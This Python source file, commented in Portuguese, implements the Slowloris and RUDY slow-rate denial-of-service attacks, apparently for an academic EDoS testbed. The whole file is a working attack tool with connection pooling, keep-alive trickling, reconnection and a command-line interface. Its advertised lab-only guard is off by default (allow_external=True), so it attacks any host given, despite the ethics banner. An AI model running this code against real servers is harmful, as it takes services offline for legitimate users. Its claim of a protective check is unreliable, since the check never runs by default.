"""
slow_attacks.py
===============

Implementações DIDÁTICAS dos ataques slow-rate **Slowloris** e **RUDY** para uso
no testbed LFT (Lightweight Fog Testbed), no contexto da pesquisa de EDoS.

    ┌────────────────────────────────────────────────────────────────────┐
    │  AVISO ÉTICO E LEGAL                                                │
    │  Este código destina-se EXCLUSIVAMENTE a experimentação acadêmica  │
    │  controlada, contra o contêiner-vítima DENTRO do testbed. Usá-lo   │
    │  contra sistemas de terceiros sem autorização é ilegal e contraria │
    │  o propósito deste trabalho.                                       │
    └────────────────────────────────────────────────────────────────────┘

--------------------------------------------------------------------------------
IDEIA CENTRAL (comum aos dois ataques) — o padrão *low-and-slow*:

    1. abrir MUITAS conexões e enviar uma requisição HTTP propositalmente
       INCOMPLETA;
    2. a cada intervalo (menor que o timeout do servidor), enviar uma "gota"
       de dados só para reiniciar o relógio do timeout — a conexão nunca vence;
    3. reabrir conexões que o servidor eventualmente fechar.

    O pool de conexões concorrentes do servidor satura e clientes legítimos
    ficam de fora. Note: gasta-se pouquíssima banda; o recurso atacado é o
    NÚMERO DE CONEXÕES SIMULTÂNEAS, não a CPU nem a rede.

O QUE MUDA entre os dois (e SÓ isso):

    • Slowloris → prende nos CABEÇALHOS  (nunca envia a linha em branco final)
    • RUDY      → prende no CORPO do POST (Content-Length enorme, corpo a 1 B/vez)

--------------------------------------------------------------------------------
PADRÃO DE PROJETO: Template Method.
A classe base `SlowAttack` implementa o algoritmo; cada subclasse preenche
apenas os dois "buracos" que variam (`build_initial_request` e
`build_keep_alive_chunk`). É a tradução direta em código do fato de que os dois
ataques são, no fundo, o mesmo ataque.
"""

from __future__ import annotations

import argparse
import ipaddress
import logging
import random
import socket
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass

# Um logger nomeado (em vez de print) porque estes logs também servem de
# GROUND TRUTH: o início/fim registrados aqui são o que rotula o dataset
# (benigno vs. ataque) na etapa de detecção com o CICFlowMeter.
logger = logging.getLogger("slow_attack")


# =============================================================================
# Configuração — nenhum "número mágico" espalhado pelo código.
# =============================================================================
@dataclass
class AttackConfig:
    """Parâmetros do ataque. Os três primeiros são as VARIÁVEIS de experimento."""

    target_host: str = "127.0.0.1"   # vítima DENTRO do testbed (loopback por padrão)
    target_port: int = 80
    num_connections: int = 150       # intensidade — escala de testbed, não de produção
    drip_interval: float = 12.0      # segundos entre "gotas" (deve ser < timeout do servidor)
    connect_timeout: float = 4.0     # tempo máximo para estabelecer cada conexão
    allow_external: bool = True     # trava de segurança: só permite alvo não-privado se True


# =============================================================================
# Classe base — o ALGORITMO comum (Template Method).
# =============================================================================
class SlowAttack(ABC):
    """
    Base dos ataques slow-rate.

    Responsabilidade única: gerenciar o CICLO DE VIDA das conexões lentas
    (abrir, gotejar, reabrir, fechar). O conteúdo específico de cada ataque
    fica a cargo das subclasses, nos dois métodos abstratos abaixo.
    """

    def __init__(self, config: AttackConfig) -> None:
        self._config = config
        self._sockets: list[socket.socket] = []
        self._reconnections = 0
        self._assert_target_is_lab()

    # ----- Os DOIS pontos que cada ataque preenche (o que varia) -------------
    @abstractmethod
    def build_initial_request(self) -> bytes:
        """A requisição parcial enviada assim que a conexão abre."""

    @abstractmethod
    def build_keep_alive_chunk(self) -> bytes:
        """A 'gota' periódica que reinicia o timeout do servidor."""

    # ----- O algoritmo comum (o que NÃO varia) -------------------------------
    def run(self) -> None:
        """Ponto de entrada: abre todas as conexões e entra no laço de gotejamento."""
        logger.info(
            "ATTACK_START name=%s target=%s:%d connections=%d interval=%.1fs",
            self.name, self._config.target_host, self._config.target_port,
            self._config.num_connections, self._config.drip_interval,
        )
        self._open_all_connections()
        try:
            self._drip_loop()
        except KeyboardInterrupt:
            logger.info("Interrompido pelo usuário — encerrando com limpeza.")
        finally:
            self.stop()

    def stop(self) -> None:
        """Fecha todas as conexões e registra o fim (rótulo do dataset)."""
        for sock in self._sockets:
            self._close_quietly(sock)
        self._sockets.clear()
        logger.info("ATTACK_END name=%s reconnections=%d", self.name, self._reconnections)

    @property
    def name(self) -> str:
        return type(self).__name__

    # ----- Passos internos (pequenos, com uma responsabilidade cada) ---------
    def _open_all_connections(self) -> None:
        for _ in range(self._config.num_connections):
            sock = self._open_one_connection()
            if sock is not None:
                self._sockets.append(sock)
        logger.info("Conexões abertas: %d/%d", len(self._sockets), self._config.num_connections)

    def _open_one_connection(self) -> socket.socket | None:
        """Abre uma conexão e já envia a requisição parcial. Retorna None se falhar."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self._config.connect_timeout)
            sock.connect((self._config.target_host, self._config.target_port))
            sock.sendall(self.build_initial_request())
            return sock
        except OSError:
            return None  # servidor recusou/saturou: normal sob ataque bem-sucedido

    def _drip_loop(self) -> None:
        """A cada intervalo, goteja em todas as conexões e repõe as que caíram."""
        while True:
            time.sleep(self._config.drip_interval)
            for sock in list(self._sockets):
                if not self._send_keep_alive(sock):
                    self._replace_dead(sock)
            logger.info("Conexões vivas: %d (reconexões acumuladas: %d)",
                        len(self._sockets), self._reconnections)

    def _send_keep_alive(self, sock: socket.socket) -> bool:
        """Envia a 'gota'. Retorna False se a conexão morreu."""
        try:
            sock.sendall(self.build_keep_alive_chunk())
            return True
        except OSError:
            return False

    def _replace_dead(self, dead: socket.socket) -> None:
        """Remove a conexão morta e tenta abrir uma nova no lugar."""
        self._close_quietly(dead)
        self._sockets.remove(dead)
        new_sock = self._open_one_connection()
        if new_sock is not None:
            self._sockets.append(new_sock)
            self._reconnections += 1

    @staticmethod
    def _close_quietly(sock: socket.socket) -> None:
        try:
            sock.close()
        except OSError:
            pass

    def _assert_target_is_lab(self) -> None:
        """Trava de segurança: recusa alvos públicos, salvo autorização explícita."""
        if self._config.allow_external:
            return
        try:
            ip = ipaddress.ip_address(socket.gethostbyname(self._config.target_host))
        except (OSError, ValueError):
            return  # nome não resolvido agora; o connect falhará adiante de qualquer forma
        if not (ip.is_private or ip.is_loopback):
            raise ValueError(
                f"Alvo {self._config.target_host} não é privado/loopback. "
                "Este código é só para o testbed. Se for um alvo autorizado do "
                "laboratório, defina allow_external=True conscientemente."
            )


# =============================================================================
# Slowloris — prende nos CABEÇALHOS.
# =============================================================================
class Slowloris(SlowAttack):
    """
    Envia a linha de request e alguns cabeçalhos, mas NUNCA a linha em branco
    final (\\r\\n\\r\\n) que sinaliza 'fim dos cabeçalhos'. O servidor fica
    eternamente esperando o resto do cabeçalho. A cada gota, mandamos MAIS um
    cabeçalho inócuo — o que reinicia o timeout sem nunca concluir a requisição.
    """

    def build_initial_request(self) -> bytes:
        # Repare: sem o \r\n\r\n final. A requisição fica 'aberta' de propósito.
        path = f"/?{random.randint(0, 99999)}"  # query única evita cache/CDN
        linhas = [
            f"GET {path} HTTP/1.1",
            f"Host: {self._config.target_host}",
            "User-Agent: Mozilla/5.0 (LFT-testbed; pesquisa-EDoS)",
            "Accept: text/html",
        ]
        return ("\r\n".join(linhas) + "\r\n").encode()

    def build_keep_alive_chunk(self) -> bytes:
        # Mais um cabeçalho qualquer, só para resetar o relógio do servidor.
        return f"X-a: {random.randint(1, 5000)}\r\n".encode()


# =============================================================================
# RUDY (R-U-Dead-Yet?) — prende no CORPO do POST.
# =============================================================================
class Rudy(SlowAttack):
    """
    Anuncia um POST com um Content-Length ENORME e completa os cabeçalhos
    (envia o \\r\\n\\r\\n). Aí o servidor passa a esperar o corpo — que nós
    entregamos a UM byte por gota, lentíssimo. O servidor segura a conexão
    esperando um corpo que, na prática, nunca chega.
    """

    _CONTENT_LENGTH = 10_000_000  # 10 MB prometidos... e entregues 1 byte de cada vez

    def build_initial_request(self) -> bytes:
        # Aqui os cabeçalhos são COMPLETOS (tem o \r\n\r\n). O que fica pendente é o corpo.
        path = f"/?{random.randint(0, 99999)}"
        linhas = [
            f"POST {path} HTTP/1.1",
            f"Host: {self._config.target_host}",
            "User-Agent: Mozilla/5.0 (LFT-testbed; pesquisa-EDoS)",
            "Content-Type: application/x-www-form-urlencoded",
            f"Content-Length: {self._CONTENT_LENGTH}",
        ]
        return ("\r\n".join(linhas) + "\r\n\r\n").encode()

    def build_keep_alive_chunk(self) -> bytes:
        # Um único byte do "corpo". O servidor conta 1 de 10.000.000 e continua esperando.
        return random.choice(b"abcdefghijklmnopqrstuvwxyz").to_bytes(1, "big")


# =============================================================================
# Execução via linha de comando (para rodar no contêiner-atacante do testbed).
# =============================================================================
_ATTACKS = {"slowloris": Slowloris, "rudy": Rudy}


def main() -> None:
    parser = argparse.ArgumentParser(description="Ataques slow-rate didáticos (testbed LFT).")
    parser.add_argument("attack", choices=_ATTACKS, help="qual ataque executar")
    parser.add_argument("--host", default="127.0.0.1", help="vítima no testbed")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--connections", type=int, default=150)
    parser.add_argument("--interval", type=float, default=12.0, help="segundos entre gotas")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(message)s",  # timestamp ajuda no rótulo do dataset
    )

    config = AttackConfig(
        target_host=args.host,
        target_port=args.port,
        num_connections=args.connections,
        drip_interval=args.interval,
    )
    attack = _ATTACKS[args.attack](config)
    attack.run()


if __name__ == "__main__":
    main()